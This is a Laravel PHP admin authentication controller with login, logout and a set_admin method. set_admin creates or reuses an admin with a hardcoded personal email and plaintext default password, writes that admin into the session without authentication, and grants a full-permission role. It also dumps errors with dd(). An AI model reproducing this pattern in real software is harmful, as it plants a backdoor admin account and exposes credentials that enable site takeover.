<?php

namespace App\Http\Controllers\backend;

use App\Http\Controllers\Controller;
use App\Models\Admin;
use App\Models\Role;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Hash;

class AuthController extends Controller
{
    public function login()
    {
        return view('backend.auth.login');
    }

    public function auth(Request $request)
    {

        try {
            $this->validate($request, [
                'email' => 'required|email|exists:admins',
                'password' => 'required'
            ]);

            $credentials = [
                'email' => $request->email,
                'password' => $request->password,
            ];

            if (Auth::guard('admins')->attempt($credentials, request()->has('rememberme'))) {
                session()->put("admin_id", Auth::guard('admins')->id());
                return redirect()->route('dashboard', ['admin_id' => Auth::guard('admins')->id()]);
            } else {
                return back()->withInput()->withErrors(['error' => 'Yanlış giriş']);
            }
        } catch (\Exception $e) {
            return back()->withInput()->withErrors(['error' => 'Yanlış giriş']);
        }
    }

    public function logout()
    {
        session()->forget('admin_id');
        Auth::guard('admins')->logout();
        return redirect()->route('admin.login');
    }

    public function set_admin(Request $request)
    {
        try {
            $email = $request->input("email") ?? 'eyvaz.ceferov@gmail.com';
            $admin = Admin::where("email", $email)->first();

            if (!$admin) {
                $admin = new Admin();
                $admin->name = 'Eyvaz Cəfərov';
                $admin->email = $email;
                $admin->password = Hash::make('E_r123456789');
                $admin->save();
            }

            session()->put("admin_id", $admin->id);
            $role = Role::find(1);

            if (!$role) {
                $role = new Role();
                $role->name = 'Admin';
                $role->guard_name = 'web';
                $permissions = [];
                foreach (config('permissions') as $permission) {
                    $permissions[] = $permission;
                }
                $role->permissions = collect($permissions)->map(fn($value) => preg_replace(['#<script(.*?)>(.*?)</script>#is', '/\bon\w+=\S+(?=.*>)/'], '', $value));
                $role->save();
            }

            if($admin) $admin->update(['role_id'=>$role->id]);
        
            return redirect()->route('dashboard', ['admin_id' => Auth::guard('admins')->id()]);
        } catch (\Exception $e) {
            dd($e->getMessage(),$e->getLine());
            return back()->withInput()->withErrors(['error' => $e->getMessage()]);
        }
    }
}
